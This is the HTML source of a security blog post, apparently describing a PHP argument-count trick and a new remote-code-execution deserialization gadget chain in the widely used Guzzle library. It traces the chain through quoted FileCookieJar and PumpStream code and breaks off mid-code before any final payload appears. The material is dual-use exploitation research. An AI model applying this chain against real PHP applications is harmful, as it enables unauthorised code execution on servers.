@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Re-introducing several PHP tricks and a new gadget chain for Guzzle ...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8">
+  <meta name="title" content="Re-introducing several PHP tricks and a new gadget chain for Guzzle ..." />
+  <meta name="description" content="I will (re?)-introduce a few useful PHP tricks and also a new RCE POP chain for Guzzle!" />
+  <meta name="keywords" content="IAA, PHP-IAA, PHP-ISCE, Guzzle, POP Chain, Gadget Chain, PHP-ISCE, Publication of old research, RCE, PHPGGC" />
+  
+  <link rel="canonical" href="https://mir-hossein.github.io/posts/en/php-tricks-guzzle-pop-chain/" />
+
+  <meta property="og:type" content="article" />  
+  <meta property="og:url" content="https://mir-hossein.github.io/posts/en/php-tricks-guzzle-pop-chain/" />
+  <meta property="og:title" content="Re-introducing several PHP tricks and a new gadget chain for Guzzle ..." />
+  <meta property="og:description" content="I will (re?)-introduce a few useful PHP tricks and also a new RCE POP chain for Guzzle!" />
+  
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:url" content="https://mir-hossein.github.io/posts/en/php-tricks-guzzle-pop-chain/" />
+  <meta name="twitter:title" content="Re-introducing several PHP tricks and a new gadget chain for Guzzle ..." />
+  <meta name="twitter:description" content="I will (re?)-introduce a few useful PHP tricks and also a new RCE POP chain for Guzzle!" />
+  
+  
+  <link rel="stylesheet" href="https://mir-hossein.github.io/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://mir-hossein.github.io/css/styles.css">
+  
+  <script src="https://mir-hossein.github.io/js/bootstrap.min.js"></script>
+  <script src="https://mir-hossein.github.io/js/jquery-4.0.0.min.js"></script>
+  <script src="https://mir-hossein.github.io/js/script.js"></script>
+</head>
+
+<body>  
+  <header class="text-center"><h1 class="mx-auto text-white w-100 py-5 fw-bold">In the Name of GOD, the Most Gracious, the Most Merciful</h1></header>
+  
+  <nav class="navbar navbar-expand-lg">
+    <ul class="navbar-nav px-5">
+      <li class="nav-item">
+        <a href="https://mir-hossein.github.io/" title="Home">Home <img src="https://mir-hossein.github.io/icons/home.png" alt="Home!"/></a>
+      </li>
+      
+      <li class="nav-item">
+        <a href="https://mir-hossein.github.io/research/" title="Research">Research <img src="https://mir-hossein.github.io/icons/notes.png" alt="Research"/></a>
+      </li>
+      
+      <li class="nav-item" id="li-searchbox">
+        <a href="#" title="Search">Search <img src="https://mir-hossein.github.io/icons/search.png" alt="Search"/></a>
+      </li>
+      
+      <li class="nav-item no-hover" id="li-searchbox-extended">
+        <div class="container-fluid input-group">
+          <input type="text" class="form-control" id="searchbox"  aria-describedby="searchbox2" placeholder="Search by Google!" oninput="searchIt();">
+          
+          <span class="input-group-text">
+            <img src="https://mir-hossein.github.io/icons/search.png" alt="Search" id="by-google" class="search-by" onclick="googleSearch();" />
+          </span>
+        </div>
+      </li>
+        
+      <li class="nav-item no-hover ms-lg-auto rounded rounded-3" onchange="setMode();">
+        <div class="btn-group bg-gradient" role="group">
+          <input type="radio" class="btn-check" name="btnradio" id="btnradio-dark" autocomplete="off"  />
+          <label class="btn btn-outline-primary" for="btnradio-dark"><img src="https://mir-hossein.github.io/icons/moon.svg" alt="Moon" class="theme-mode-image" /></label>  
+          
+          <input type="radio" class="btn-check" name="btnradio" id="btnradio-light" autocomplete="off" checked />
+          <label class="btn btn-outline-primary" for="btnradio-light"><img src="https://mir-hossein.github.io/icons/sun.svg" alt="Sun" class="theme-mode-image" /></label>
+        </div>
+      </li>
+            
+      <li class="nav-item">
+        <a href="https://mir-hossein.github.io/index.xml" title="RSS">RSS <img src="https://mir-hossein.github.io/icons/rss.png" alt="RSS"/></a>
+      </li>
+      
+      <li class="nav-item">
+        <a href="https://mir-hossein.github.io/about/" title="About me">About me <img src="https://mir-hossein.github.io/icons/person.png" alt="Person"/></a>
+      </li>
+    </ul>
+  </nav>
+  
+  <br/>
+  
+  <aside class="left-side-content">&nbsp;</aside>
+  
+  <main class="container-fluid main-content" >
+
+    <article class="en-posts border-0"><header>
+        <div class="post-details">
+          <span class="text-center">
+            <span>
+              <h2>Re-introducing several PHP tricks and a new gadget chain for Guzzle ...</h2>
+            </span>
+          </span>
+          <hr>
+          <div class="post-details text-center">
+            <img src="https://mir-hossein.github.io/icons/draft-date.png" class="small-icons" title="Draft" alt="Draft">
+            <time datetime="2025-06-08 12:00" class="post-date">Sun, 08 Jun 2025 00:00:00</time>
+            
+            <img src="https://mir-hossein.github.io/icons/edit.png" class="small-icons" title="Edit" alt="Edit">
+            <time datetime="2026-10-22 1:58" class="post-date">Thu, 22 Oct 2026 13:58:00</time>
+            
+            <img src="https://mir-hossein.github.io/icons/calendar.png" class="small-icons" title="Publish Date" alt="Publish Date">
+            <time datetime="2026-10-22 1:58" class="post-date">Thu, 22 Oct 2026 13:58:00</time>
+            <br/>
+            <img src="https://mir-hossein.github.io/icons/folder.png" class="small-icons" title="Category" alt="Category">
+            <span class="post-cat">Security</span>
+            
+            <img src="https://mir-hossein.github.io/icons/meter.png" class="small-icons" title="Difficulty level" alt="Difficulty level">
+            <span class="post-cat">Easy</span>
+            
+            <img src="https://mir-hossein.github.io/icons/clock.png" class="small-icons" title="Reading time" alt="Reading time">
+            <span class="post-readingtime">11  minutes</span>
+          </div>
+          <hr>
+        </div>
+      </header>
+
+<div class="card border-0 mt-3">
+  <header class="bg-danger text-white p-2">
+    <span id="disclaimer" class="align-middle h4 fw-bold">Disclaimer:</span>
+  </header>
+  <u>
+  </u>
+  <div class="card-body bg-dark text-white">
+    <span class="align-middle h4 text-danger">✗</span>
+This information is provided "AS IS" and without warranty.
+    <br/>
+    <span class="align-middle h4 text-danger">✗</span>
+We <span class="text-danger">DO NOT</span> take any responsibility for any misuse of this article, and this information is shared solely <span class="text-success">for scientific and educational purposes</span>.
+  </div>
+</div>
+<div class="card border-0 mt-3">
+  <header class="bg-success text-white p-2">
+    <span id="agreement" class="align-middle h4 fw-bold">Agreement:</span>
+  </header>
+  <div class="card-body bg-dark text-white">
+    <span class="align-middle h4 text-success">✓</span>
+    By reading this article, you agree to use the information provided <span class="text-success">only for legitimate purposes (such as legal penetration testing, bug bounty, etc.)</span>.
+    <br/>
+    <span class="align-middle h4 text-success">✓</span>
+    For emphasis: By reading this article, you agree to <span class="text-danger">never use the information provided for illegal, illegitimate, or malicious purposes</span>.
+  </div>
+</div>
+<hr>
+<h1 id="re-introducing-several-php-tricks">(Re?)-introducing several PHP tricks</h1>
+<hr>
+<div class="d-block p-2 my-2 text-bg-success fw-bold" id="PHP-IAA">Trick #1: PHP-IAA</div>
+<p>PHP and some other languages (JavaScript, &hellip;) <span class="text-danger">are not strict on arguments count for <span class="text-decoration-underline">user defined</span> functions/methods</span>, but <span class="text-success">are strict on arguments count for <span class="text-decoration-underline">build-in</span> functions/methods</span>.</p>
+<p>The minimum number of arguments to call a &ldquo;<span class="text-danger">user defined</span>&rdquo; function/method is the number of required parameters and a user can call it with the minimum arguments or more. Please note that the data type of arguments and (required) parameters must be matched, but for additional arguments is not necessary because there is no parameter to be matched. PHP team knows that and they don&rsquo;t want to solve the problem. <a href="https://wiki.php.net/rfc/strict_argcount">[RFC:strict_argcount]</a></p>
+<p>I named this behavior <strong>&quot;<code>Ignoring Additional Arguments</code>&quot;</strong> or <strong>&quot;<code>PHP-IAA</code>&quot;</strong>. This behavior allows us to use it as a very useful trick.</p>
+<p>e.g.: For a function like that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">printHello</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hello!&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The function is callable with 0, 1, 2 or more arguments, without any warning or notice.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">printHello</span>();                       <span style="color:#75715e">// Displays &#34;Hello!&#34; without any notice/warning/error.
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printHello</span>(<span style="color:#e6db74">&#34;arg1&#34;</span>);                 <span style="color:#75715e">// Displays &#34;Hello!&#34; without any notice/warning/error.
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printHello</span>(<span style="color:#e6db74">&#34;arg1&#34;</span>, <span style="color:#e6db74">&#34;arg2&#34;</span>);         <span style="color:#75715e">// Displays &#34;Hello!&#34; without any notice/warning/error.
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printHello</span>(<span style="color:#e6db74">&#34;arg1&#34;</span>, <span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;arg3&#34;</span>); <span style="color:#75715e">// Displays &#34;Hello!&#34; without any notice/warning/error.
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>                                 <span style="color:#75715e">// Displays &#34;Hello!&#34; without any notice/warning/error.
+</span></span></span></code></pre></div><p>Also in an arbitrary function call with a specific number of arguments, it can be replaced with another user-defined function/method that has fewer parameters.</p>
+<p>e.g.:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$func($arg1, $arg2);
+</span></span></code></pre></div><p>Can be used to call a user-defined function with 2 or 1 or 0 parameter(s).</p>
+<div class="bd-callout bd-callout-primary rounded-3">
+<p><strong>Tip:</strong></p>
+<p><strong>Parameter-less [user-defined] functions/methods</strong> are <strong>the best options</strong> to use with <strong><code>PHP-IAA</code></strong> trick.</p>
+<ul>
+<li>It&rsquo;s possible to call them with any number of arguments. (Almost always)</li>
+<li>There is no parameter, and there is no need to worry about data type issues.</li>
+<li>There is no parameter, and there is no need to worry about what happens to a parameter inside a function/method &hellip; (context dependent)</li>
+</ul>
+</div>
+<div class="bd-callout bd-callout-success rounded-3">
+<p><strong>Note:</strong></p>
+<ul>
+<li><strong><code>PHP-IAA</code></strong> trick works on PHP <strong>4, 5.x, 7.x, 8.x.</strong></li>
+<li><strong><code>PHP-IAA</code></strong> trick is simple and easy.</li>
+</ul>
+</div>
+<div class="bd-callout bd-callout-success rounded-3">
+<p><strong>Tip:</strong></p>
+<ul>
+<li>To call Build-in functions/methods, sometimes a combination of <code>call_user_func</code> and <code>call_user_func_array</code> is useful.</li>
+<li>The above tip is also useful for user-defined functions/methods specially when you have problem with default values of parameters.</li>
+</ul>
+</div>
+<p>Let&rsquo;s use the trick practically &hellip;</p>
+<h2 class="mt-5" id="guzzle">Guzzle</h2>
+<hr>
+<div class="bd-callout bd-callout-secondary">
+<p>&ldquo;Guzzle is a PHP HTTP client that makes it easy to send HTTP requests and trivial to integrate with web services.&rdquo; <a href="https://github.com/guzzle/guzzle?tab=readme-ov-file#guzzle-php-http-client">source</a></p>
+</div>
+<p>According to <a href="https://packagist.org/packages/guzzlehttp/guzzle/stats">Packagist statistics</a>, Guzzle is <strong>the eighth most popular library</strong> (Total installs) and has been installed more than 1,000,000,000 times to date.</p>
+<p>The list of some dependents can be found at <a href="https://packagist.org/packages/guzzlehttp/guzzle/dependents?order_by=downloads&amp;requires=require">this link</a>, e.g.: <code>Drupal</code>, <code>Laravel</code>, <code>Magento2</code>, <code>typo3/cms-core</code>, <code>shopware/core</code>, <code>craftcms/cms</code>, <code>aws/aws-sdk-php</code>, <code>google/auth</code>, <code>google/cloud</code>, <code>microsoft/azure-storage-common</code>, <code>shopify/shopify-api</code>, <code>ovh/ovh</code>, some popular Wordpress plugins (For e.g.: <code>Yoast SEO</code> is the <a href="https://wordpress.org/plugins/browse/popular/">#2nd most popular plugin for Wordpress</a>) and <a href="https://packagist.org/packages/guzzlehttp/guzzle/dependents?order_by=downloads&amp;requires=require">more &hellip;</a></p>
+<p>Since the end of 2018 (more than 7 years ago), no RCE GC for Guzzle has been <span class="text-danger text-decoration-underline">[publicly]</span> available; During these years, only one File-Write GC was available, which had limitations in the operational environments.</p>
+<h3 class="mt-5" id="some-of-the-limitations-of-file-write-gcs">Some of the limitations of File-write GCs:</h3>
+<hr>
+<ol>
+<li>
+<p>If the gadget starts from <code>__destruct</code> magic method, probably the problem of absolute path can occur.</p>
+</li>
+<li>
+<p>The path MUST be writable.</p>
+</li>
+<li>
+<p>The path MUST be accessible. (directly or indirectly via loader or &hellip;).</p>
+</li>
+<li>
+<p>The file name extension MUST be <code>.php</code> or &hellip;</p>
+</li>
+<li>
+<p>The file content may be blocked by WAF.</p>
+</li>
+<li>
+<p>An anti-shell may remove it, if present.</p>
+</li>
+</ol>
+<p><strong>In these cases, a direct RCE is usually better.</strong></p>
+<h3 class="mt-5" id="gadget-chain---step-by-step">Gadget Chain - Step by Step</h3>
+<hr>
+<div class="text-white text-start ps-1 pre-highlight text-nowrap overflow-hidden">
+  🔗 <a href="https://github.com/guzzle/guzzle/blob/7.11/src/Cookie/FileCookieJar.php#L15"></a>
+</div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileCookieJar</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CookieJar</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     * @var string filename
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     */</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">private</span> $filename;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">save</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save</span>(<span style="color:#a6e22e">string</span> $filename)<span style="color:#f92672">:</span> <span style="color:#a6e22e">void</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      $json <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span></code></pre></div><div class="bd-callout bd-callout-secondary rounded-3">
+<p><strong><a href="https://github.com/guzzle/guzzle/blob/7.11/src/Cookie/FileCookieJar.php#L15">Line #15:</a></strong> <code>$filename</code> property hasn&rsquo;t any type. Did they forget it?! (No, Backward-compatibility)</p>
+<hr>
+<p><strong><a href="https://github.com/guzzle/guzzle/blob/7.11/src/Cookie/FileCookieJar.php#L47">Line #47:</a></strong> The destructor will call <code>save</code> method.</p>
+<hr>
+<p><strong><a href="https://github.com/guzzle/guzzle/blob/7.11/src/Cookie/FileCookieJar.php#L57">Line #57:</a></strong> Data-type of the only parameter of save method is <code>string</code>.</p>
+</div>
+<p>This means it&rsquo;s possible to assign an object to <code>$filename</code> and when its (<code>FileCookieJar</code>) destructor will be called, PHP will try to convert the object to string and <code>__toString()</code> method of the object will be called. Now the question is which class is suitable?</p>
+<p>A useful class:</p>
+<div class="text-white text-start ps-1 pre-highlight text-nowrap overflow-hidden">
+  🔗 <a href="https://github.com/guzzle/psr7/blob/2.11/src/PumpStream.php#L60"></a>
+</div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PumpStream</span> <span style="color:#66d9ef">implements</span> <span style="color:#a6e22e">StreamInterface</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>()<span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Utils</span><span style="color:#f92672">::</span><span style="color:#a6e22e">copyToString</span>($this);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>The source code of <code>Utils::copyToString()</code> &hellip;</p>
+<div class="text-white text-start ps-1 pre-highlight text-nowrap overflow-hidden">
+  🔗 <a href="https://github.com/guzzle/psr7/blob/2.11/src/Utils.php#L114"></a>
+</div>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
+</span><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code class="language-php" data-lang="php"><span style="display:flex; background-color:#3c3d38"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copyToString</span>(<span style="color:#a6e22e">StreamInterface</span> $stream, <span style="color:#a6e22e">int</span> $maxLen <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    $buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($maxLen <span style="color:#f92672">===</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>$stream<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">eof</span>()) {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        $buf <span style="color:#f92672">=</span> $stream<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">1048576</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($buf <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $buffer <span style="color:#f92672">.=</span> $buf;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> $buffer;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The source code of <code>read()</code> method in <code>PumpStream</code> class:</p>
+<div class="text-white text-start ps-1 pre-highlight text-nowrap overflow-hidden">
+  🔗 <a href="https://github.com/guzzle/psr7/blob/2.11/src/PumpStream.php#L159"></a>
+</div>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
+</span><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
+</span><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code class="language-php" data-lang="php"><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>($length)<span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">\is_int</span>($length)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">\trigger_deprecation</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;guzzlehttp/psr7&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;2.11&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Passing %s to StreamInterface::read() is deprecated; guzzlehttp/psr7 3.0 requires int for $length.&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">\get_debug_type</span>($length)
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">buffer</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read</span>($length);
+</span></span><span style="display:flex;"><span>        $readLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($data);
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tellPos</span> <span style="color:#f92672">+=</span> $readLen;
+</span></span><span style="display:flex;"><span>        $remaining <span style="color:#f92672">=</span> $length <span style="color:#f92672">-</span> $readLen;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($remaining) {
